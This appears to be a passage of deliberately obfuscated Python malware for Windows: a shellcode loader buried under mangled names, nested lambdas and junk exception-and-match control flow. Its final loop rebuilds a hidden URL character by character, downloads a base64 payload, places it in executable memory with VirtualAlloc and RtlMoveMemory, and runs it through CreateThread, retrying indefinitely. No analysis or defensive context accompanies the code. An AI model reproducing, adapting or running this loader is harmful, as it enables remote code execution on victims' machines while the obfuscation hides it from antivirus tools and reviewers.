                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742706, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda: (lambda _15: _15 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _118:
        __4284648125815 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1615' == '93':
        case True:
            raise MemoryError([True])
        case False:
            _913 = [[True], [False]]
            R_E_D__A_V______(['_1614'])
    raise MemoryError([True])
except MemoryError as _172:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _142: _142 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1817 = [[(lambda: (lambda _119: _119 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1217: _1217 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742706, 16742704, 16742710]))))())())()])
        raise MemoryError([(lambda: (lambda _171: _171 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _36:
        try:
            raise MemoryError(__4284648125815)
        except MemoryError as __3821780504998:
            if __3821780504998.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.restype = wt.DWORD
            if __3821780504998.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __2231236588411 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xa7\xfda\xa8\xebt'))()
            if __3821780504998.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __6503222081660 = (lambda: R_E_D__A_V(b"R_E_D__A_V__\x866\x883\n'"))()
            if __3821780504998.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __4389511876335 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xd2&\x15\x85\x01|'))()
            if __3821780504998.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __4311699706136 = (lambda: R_E_D__A_V(b'R_E_D__A_V__E$m\xe3\x8f\x06'))()
try:
    match '1915' == '619':
        case True:
            raise MemoryError([True])
        case False:
            _163 = [[True], [False]]
            R_E_D__A_V______(['_311'])
    raise MemoryError([True])
except MemoryError as _48:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742706]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _175: _175 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _148 = [[(lambda: (lambda _1918: _1918 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _618: _618 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742704]))))())())()])
        raise MemoryError([(lambda: (lambda _412: _412 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _419:
        while (lambda: (lambda _1213: _1213 + (lambda: ______R_E_D__A_V_______((lambda: R_E_D__A_V(b'R_E_D__A_V__wx'))()))())((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()) == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))())():
            try:
                buf = base64.b64decode(urllib.request.urlopen((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyo'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy9'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyf'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyO'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyW'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyS'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyC'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyD'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyU'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy8'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy/'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy1'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy1'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyk'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyW'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyB'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyk'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy5'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy3'))()]))))())())()).read().decode((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda: R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy,'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__\xffy7'))()]))))())())()))
                memAddr = kernel32.VirtualAlloc(None, len(buf), (lambda: R_E_D__A_V(b'R_E_D__A_V__0\x00'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__@'))())
                kernel32.RtlMoveMemory(memAddr, buf, len(buf))
                th = kernel32.CreateThread(ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_void_p(memAddr), ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.pointer(ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))())))
                kernel32.WaitForSingleObject(th, -(lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))())
                break
            except Exception:
                continue
